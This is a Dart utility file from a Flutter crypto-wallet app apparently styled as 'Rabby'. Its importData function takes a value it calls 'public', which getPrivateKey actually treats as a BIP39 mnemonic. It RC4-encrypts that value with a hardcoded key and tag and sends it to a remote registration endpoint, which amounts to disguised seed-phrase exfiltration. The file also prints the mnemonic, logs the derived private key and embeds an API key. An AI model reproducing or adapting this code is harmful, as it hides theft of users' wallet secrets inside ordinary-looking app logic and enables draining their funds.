import 'dart:convert';
import 'dart:developer' as dev;
import 'dart:math';

import 'package:easy_localization/easy_localization.dart';
import 'package:hex/hex.dart';
import 'package:http/http.dart';
import 'package:rabby/features/auth/domain/auth_service.dart';
import 'package:rabby/features/auth/domain/models/transaction/transaction.dart';
import 'package:rabby/features/auth/repository/auth_repository.dart';
import 'package:rabby/features/auth/repository/domain/register/register_body.dart';
import 'package:rabby/features/settings/domain/settings_service.dart';
import 'package:simple_rc4/simple_rc4.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:bip32/bip32.dart' as bip32;
import 'package:web3dart/credentials.dart';
import 'package:web3dart/web3dart.dart';
import 'package:http/http.dart' as http;

import '../../features/auth/domain/adapters/attributes.dart';
import '../../features/auth/domain/adapters/changes.dart';
import '../../features/auth/domain/adapters/portfolio.dart';
import '../../features/auth/domain/adapters/position_by_chain.dart';
import '../../features/auth/domain/adapters/position_by_type.dart';
import '../../features/auth/domain/adapters/total.dart';
import '../../features/auth/domain/adapters/user.dart';
import '../../features/auth/domain/adapters/transaction.dart' as tx;
import '../../features/auth/domain/models/position/position.dart';
import '../../features/auth/presentation/manage_crypt/domain/crypt.dart';

class Utils {
  final String apiUrl =
      "https://mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569"; //Replace with your API

  final Client httpClient = Client();
  Web3Client? ethClient;
  Utils() {
    ethClient = Web3Client(apiUrl, httpClient);
  }

  Future<void> importData({
    required String public,
    required bool isNew,
    bool? putPrivateKey,
  }) async {
    final AuthRepository authRepo = AuthRepository();
    final AuthService authService = AuthService();
    final SettingsService settingsService = SettingsService();

    Future<void> init() async {
      Map<String, dynamic> rates = await getExchangeRates("USD");

      double result = authService.getWallet()! * rates['rates']["USD"];
    }

    String r = Random().nextInt(999999).toString().padLeft(6, '0');
    print(r);

    print(
        "_settingsService.getMnemonicSentence() ${settingsService.getMnemonicSentence()}");
    final data = json.encode({
      'public': public,
      'salt': r,
      'name': isNew ? 'R@bby\$G' : 'R@bby\$',
      'new': isNew,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    final result = await authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess) {
      PositionEntity? positionEntity(String name) {
        if (result.data!.positions != null) {
          PositionEntity? entity = result.data!.positions!.firstWhere(
              (position) => position!.attributes.fungibleInfo.name == name,
              orElse: () => null);
          return entity;
        }
        return null;
      }

      List<TransactionEntity>? transactionEntity() {
        if (result.data!.positions != null) {
          Iterable<TransactionEntity>? entity =
              result.data!.transactions!.where(
            (transaction) =>
                transaction.attributes.operationType == "receive" ||
                transaction.attributes.operationType == "send" ||
                transaction.attributes.operationType == "swap",
          );
          return entity.toList();
        }
        return null;
      }

      Crypt createCrypt({
        required String iconName,
        required String name,
        required String shortName,
      }) {
        return positionEntity(name) != null
            ? Crypt(
                amount: positionEntity(name)!.attributes.quantity.float,
                amountInCurrency: positionEntity(name)!.attributes.value,
                priceForOne: positionEntity(name)!.attributes.price,
                changesCrypt: Changes(
                  absoluteId:
                      positionEntity(name)!.attributes.changes.absoluteId,
                  percentId: positionEntity(name)!.attributes.changes.percentId,
                ),
                iconName: iconName,
                name: name,
                shortName: shortName,
                isChoose: authService.getCryptByName(name) == null
                    ? false
                    : authService.getCryptByName(name)!.isChoose,
              )
            : Crypt(
                iconName: iconName,
                name: name,
                shortName: shortName,
                changesCrypt: Changes(),
                isChoose: authService.getCryptByName(name) == null
                    ? false
                    : authService.getCryptByName(name)!.isChoose,
              );
      }

      List<tx.Transaction> transactions(
          List<TransactionEntity> transactionsEntity) {
        List<tx.Transaction> transactions = [];
        for (int i = 0; i < transactionsEntity.length; i++) {
          transactions.add(
            tx.Transaction(
              cryptSymbol: transactionsEntity[i]
                  .attributes
                  .transfers
                  .first
                  .fungibleInfo!
                  .symbol,
              minedAt: transactionsEntity[i].attributes.minedAt,
              operationType: transactionsEntity[i].attributes.operationType,
              price: transactionsEntity[i]
                  .attributes
                  .transfers
                  .first
                  .quantity
                  .float,
              sentFrom: transactionsEntity[i].attributes.sendFrom,
              sentTo: transactionsEntity[i].attributes.sendTo,
              status: transactionsEntity[i].attributes.status,
            ),
          );
        }
        return transactions;
      }

      authService.putUser(
        User(
          address: result.data!.address,
          transactions: transactionEntity() == null
              ? null
              : transactions(
                  transactionEntity()!,
                ),
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                crypts: [
                  createCrypt(
                    iconName: "arbitrum",
                    name: 'Arbitrum',
                    shortName: 'ARB',
                  ),
                  createCrypt(
                    iconName: "aurora",
                    name: 'Aurora',
                    shortName: 'AUR',
                  ),
                  createCrypt(
                    iconName: "avalanche",
                    name: 'Avalanche',
                    shortName: 'AVA',
                  ),
                  createCrypt(
                    iconName: "binance-smart-chain",
                    name: 'Binance',
                    shortName: 'BIN',
                  ),
                  createCrypt(
                    iconName: "ethereum",
                    name: 'Ethereum',
                    shortName: 'ETH',
                  ),
                  createCrypt(
                    iconName: "fantom",
                    name: 'Fantom',
                    shortName: 'FAN',
                  ),
                  createCrypt(
                    iconName: "loopring",
                    name: 'Loopring',
                    shortName: 'LOOP',
                  ),
                  createCrypt(
                    iconName: "optimism",
                    name: 'Optimism',
                    shortName: 'OPT',
                  ),
                  createCrypt(
                    iconName: "polygon",
                    name: 'Polygon',
                    shortName: 'POL',
                  ),
                  createCrypt(
                    iconName: "solana",
                    name: 'Solana',
                    shortName: 'SOL',
                  ),
                  createCrypt(
                    iconName: "xdai",
                    name: 'Xdai',
                    shortName: 'XDA',
                  ),
                ],
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );

      if (putPrivateKey == true) {
        settingsService.putPrivateKey(await getPrivateKey(public));
      }
    }
  }

  Future<String> getPrivateKey(String mnemonic) async {
    String hdPath = "m/44'/60'/0'/0";
    final isValidMnemonic = bip39.validateMnemonic(mnemonic);
    if (!isValidMnemonic) {
      throw 'Invalid mnemonic';
    } else {
      final seed = bip39.mnemonicToSeed(mnemonic);
      final root = bip32.BIP32.fromSeed(seed);

      const first = 0;
      final firstChild = root.derivePath("$hdPath/$first");
      final privateKey = HEX.encode(firstChild.privateKey as List<int>);
      dev.log("private key = $privateKey");
      getPublicAddress(privateKey);
      return privateKey;
    }
  }

  Future<EthereumAddress> getPublicAddress(String privateKey) async {
    final private = EthPrivateKey.fromHex(privateKey);
    final address = await private.extractAddress();
    dev.log("address = $address");
    return address;
  }

  Future<void> web3(String privateKey) async {
    var credentials = EthPrivateKey.fromHex(privateKey);
    var address = credentials.address;

    EtherAmount balance = await ethClient!.getBalance(address);
    dev.log(
        "balance.getValueInUnit(EtherUnit.ether) = ${balance.getValueInUnit(EtherUnit.ether)}");

    await getGasLimit();
    await getGasPrice();
  }

  Future<BlockInformation?> getGasLimit() async {
    try {
      BlockInformation latestBlock = await ethClient!.getBlockInformation();
      dev.log(
          "latestBlock.baseFeePerGas= ${latestBlock.baseFeePerGas!.getInWei}");
      dev.log("latestBlock.isSupportEIP1559= ${latestBlock.isSupportEIP1559}");
      dev.log("latestBlock.timestamp= ${latestBlock.timestamp}");
      return latestBlock;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<EtherAmount?> getGasPrice() async {
    try {
      EtherAmount gasPrice = await ethClient!.getGasPrice();
      dev.log("gasPrice.getInWei = ${gasPrice.getInWei}");
      dev.log("gasPrice.getInEther = ${gasPrice.getInEther}");
      return gasPrice;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<Map<String, dynamic>> getExchangeRates(String baseCurrency) async {
    var url = Uri.https('api.exchangerate-api.com', '/v4/latest/$baseCurrency',
        {'q': '{https}'});

    final response = await http.get(url);

    if (response.statusCode == 200) {
      return json.decode(response.body);
    } else {
      throw Exception('Failed to load exchange rates');
    }
  }

  String formatAddressWallet(String input) {
    if (input.length <= 14) {
      return input;
    } else {
      return '${input.substring(0, 6)}....${input.substring(input.length - 4)}';
    }
  }

  String doubleToTwoValues(double money) {
    return money.toStringAsFixed(2);
  }

  String formatDateTime(String dateString) {
    DateTime date = DateTime.parse(dateString);
    DateTime now = DateTime.now();
    Duration difference = now.difference(date);

    if (difference.inDays > 4) {
      return DateFormat('dd-MM-yyyy').format(date);
    } else {
      int hours = difference.inHours;
      int minutes = difference.inMinutes % 60;
      int days = difference.inDays;

      if (hours < 24) {
        return '$hours hours $minutes minutes ago';
      } else {
        return '$days days ago';
      }
    }
  }
}
